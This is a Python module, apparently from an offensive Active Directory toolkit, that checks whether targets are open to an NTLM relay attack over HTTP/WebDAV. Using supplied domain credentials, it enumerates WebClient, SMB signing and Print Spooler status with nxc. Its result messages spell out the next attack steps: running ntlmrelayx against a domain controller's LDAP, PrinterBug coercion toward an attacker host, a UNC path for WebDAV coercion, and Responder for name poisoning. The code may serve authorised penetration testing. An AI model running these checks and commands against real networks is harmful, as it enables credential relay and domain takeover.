"""
WebDAV / HTTP prerequisite checks for NTLM Relay → HTTP/WebDAV.

The WebDAV relay attack coerces a Windows machine to authenticate via WebDAV
(which uses HTTP + NTLM), bypassing SMB signing restrictions.

Prerequisites:
  [REQ]  WebClient service running on target(s)  (enables WebDAV coercion)
  [REQ]  Port 80 reachable on at least one target OR intranet zone trick works
  [REQ]  NTLM relay listener (e.g. ntlmrelayx) can receive the coerced auth
  [OPT]  NetBIOS/mDNS/LLMNR poisoning possible (for coercion without creds)
  [OPT]  PrinterBug / PetitPotam / other coercion available to trigger auth
"""
from __future__ import annotations
import socket
import subprocess

from .base import BaseCheck, CheckResult, Status
from ..config import TargetEnv


# ── helpers ────────────────────────────────────────────────────────────────

def _port_open(host: str, port: int, timeout: int = 5) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except OSError:
        return False


def _run_nxc(args: list[str], env: TargetEnv, timeout: int = 20) -> tuple[int, str, str]:
    try:
        cmd = ["nxc"] + args
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        try:
            cmd[0] = "crackmapexec"
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return r.returncode, r.stdout, r.stderr
        except FileNotFoundError:
            return -1, "", "nxc not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"


def _run_nxc_smb_module(module: str, env: TargetEnv,
                         target: str) -> tuple[int, str, str]:
    return _run_nxc(
        ["smb", target,
         "-u", env.cred.username,
         "-p", env.cred.password,
         "-d", env.domain,
         "--module", module],
        env,
    )


def _http_options(host: str, timeout: int = 8) -> tuple[int, dict, str]:
    """Send HTTP OPTIONS to check WebDAV support."""
    import urllib.request
    import urllib.error
    try:
        req = urllib.request.Request(
            f"http://{host}/", method="OPTIONS",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), ""
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), ""
    except Exception:
        return -1, {}, ""


# ── individual checks ──────────────────────────────────────────────────────

class WebClientServiceCheck(BaseCheck):
    """
    The WebClient service must be running on the target for WebDAV coercion.
    When running, the machine will connect back via HTTP for UNC paths like
    \\attacker@80/share — bypassing SMB signing.

    Method: nxc smb <target> --module webdav
            OR nxc smb <target> -u user -p pass --local-auth --services (look for WebClient)
    """

    name = "WebClient service running on ≥1 target"

    def _run(self) -> CheckResult:
        webclient_hosts: list[str] = []
        no_webclient: list[str] = []
        errors: list[str] = []

        for host in self.env.smb_targets():
            rc, out, err = _run_nxc_smb_module("webdav", self.env, host)
            combined = (out + err).lower()

            if rc == -1:
                errors.append(host)
                continue

            # nxc webdav module output parsing
            # actual output: "WebClient Service enabled on: <ip>"
            #             or "WebClient Service disabled on: <ip>"
            if "webclient service enabled" in combined or "webdav: true" in combined or "webdav service enabled" in combined:
                webclient_hosts.append(host)
            elif "webclient service disabled" in combined or "webdav: false" in combined or "not running" in combined or "stopped" in combined:
                no_webclient.append(host)
            else:
                # Try services check as fallback
                rc2, out2, err2 = _run_nxc(
                    ["smb", host,
                     "-u", self.env.cred.username,
                     "-p", self.env.cred.password,
                     "-d", self.env.domain,
                     "--services"],
                    self.env,
                )
                combined2 = (out2 + err2).lower()
                if "webclient" in combined2 and ("running" in combined2 or "started" in combined2):
                    webclient_hosts.append(f"{host}(via services)")
                elif "webclient" in combined2:
                    no_webclient.append(f"{host}(stopped)")
                else:
                    errors.append(f"{host}:unknown")

        if webclient_hosts:
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"WebClient service RUNNING on: {', '.join(webclient_hosts)}. "
                    "WebDAV coercion viable — machine will authenticate via HTTP. "
                    "When exploiting, start ntlmrelayx on port 80 before triggering: "
                    "`ntlmrelayx.py -t ldap://<dc> --http-port 80`"
                ),
            )
        if not errors and no_webclient:
            return CheckResult(
                name=self.name, status=Status.FAIL,
                detail=(
                    f"WebClient service NOT running on: {', '.join(no_webclient)}. "
                    "WebDAV coercion requires WebClient to be started on target. "
                    "Tip: can sometimes be triggered remotely via search-ms URI or scheduled tasks."
                ),
            )
        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail=(
                "Could not determine WebClient status. "
                f"Errors: {'; '.join(errors) if errors else 'nxc webdav module not available'}. "
                "Try: nxc smb <target> --module webdav"
            ),
        )





class SmbSigningBypassViaWebdavCheck(BaseCheck):
    """
    WebDAV relay specifically bypasses SMB signing requirements.
    Confirm that SMB signing is enforced (making WebDAV the necessary path).

    Method: Same as SMB signing check — if signing IS required, WebDAV is valuable.
    """

    name = "SMB signing enforced (WebDAV bypass needed/useful)"
    required = False  # informational — WebDAV useful precisely when SMB signing required

    def _run(self) -> CheckResult:
        # Check SMB signing on targets
        signed_hosts = []
        for host in self.env.smb_targets():
            rc, out, err = _run_nxc(
                ["smb", host,
                 "-u", self.env.cred.username,
                 "-p", self.env.cred.password,
                 "-d", self.env.domain],
                self.env,
            )
            combined = (out + err).lower()
            if rc == -1:
                continue
            if "signing:true" in combined or "signing: true" in combined:
                signed_hosts.append(host)

        if signed_hosts:
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"SMB signing enforced on {', '.join(signed_hosts)}. "
                    "WebDAV relay is the primary bypass — auth goes over HTTP (no signing)."
                ),
            )
        return CheckResult(
            name=self.name, status=Status.WARN,
            detail=(
                "SMB signing not enforced — direct SMB relay may be simpler. "
                "WebDAV relay still works if preferred."
            ),
        )


class CoercionMethodCheck(BaseCheck):
    """
    A coercion method must be available to trigger outbound authentication.
    Common methods: PrinterBug (MS-RPRN), PetitPotam (MS-EFSRPC), DFSCoerce,
    ShadowCoerce, or social engineering / search-ms URI.

    Method: Check if PrinterBug works (nxc smb --module printerbug)
            and if PetitPotam is possible.
    """

    name = "Coercion method available (PrinterBug / PetitPotam)"
    required = False   # requires attacker to have a method but we can only hint

    def _run(self) -> CheckResult:
        # Check Spooler service (PrinterBug)
        spooler_hosts = []
        for host in self.env.smb_targets():
            rc, out, err = _run_nxc(
                ["smb", host,
                 "-u", self.env.cred.username,
                 "-p", self.env.cred.password,
                 "-d", self.env.domain,
                 "--module", "spooler"],
                self.env,
            )
            combined = (out + err).lower()
            if rc != -1 and (
                "spooler service enabled" in combined or
                "spooler: true" in combined or
                "running" in combined
            ):
                spooler_hosts.append(host)

        if spooler_hosts:
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"Print Spooler service running on: {', '.join(spooler_hosts)}. "
                    "PrinterBug coercion available. "
                    "Command: `printerbug.py <domain>/<user>:<pass>@<target> <attacker>`"
                ),
            )

        return CheckResult(
            name=self.name, status=Status.WARN,
            detail=(
                "Could not confirm coercion method automatically. "
                "Check manually: Print Spooler (MS-RPRN), EFS (PetitPotam/MS-EFSRPC), "
                "DFSCoerce, ShadowCoerce, or search-ms URI trick."
            ),
        )


class LlmnrNbtnsCheck(BaseCheck):
    """
    Optional: LLMNR/NBT-NS/mDNS poisoning enables coercion without explicit triggers.
    Requires Responder or similar tool.

    This check is informational — we detect if the domain has name resolution fallback.
    Method: passive check — just report that LLMNR is commonly enabled.
    """

    name = "LLMNR/NBT-NS poisoning possible (optional coercion)"
    required = False

    def _run(self) -> CheckResult:
        # Try to detect LLMNR by looking for mDNS/LLMNR responses
        # This is a lightweight check — true detection needs Responder
        try:
            # Check if responder is installed
            r = subprocess.run(["responder", "--version"],
                               capture_output=True, text=True, timeout=5)
            if r.returncode == 0 or "responder" in (r.stdout + r.stderr).lower():
                return CheckResult(
                    name=self.name, status=Status.WARN,
                    detail=(
                        "Responder found. Run `responder -I <iface> -A` (analyze mode) "
                        "to detect LLMNR/NBT-NS traffic without actively poisoning. "
                        "If present, name poisoning can coerce auth without targeting specific hosts."
                    ),
                )
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail=(
                "Responder not found or LLMNR status unknown. "
                "Install Responder and run in analyze mode to check: "
                "`responder -I eth0 -A`"
            ),
        )


# ── attack check list ──────────────────────────────────────────────────────

def get_checks(env: TargetEnv) -> list[BaseCheck]:
    return [
        WebClientServiceCheck(env),
        SmbSigningBypassViaWebdavCheck(env),
        CoercionMethodCheck(env),
        LlmnrNbtnsCheck(env),
    ]

ATTACK_NAME = "NTLM Relay → HTTP/WebDAV"
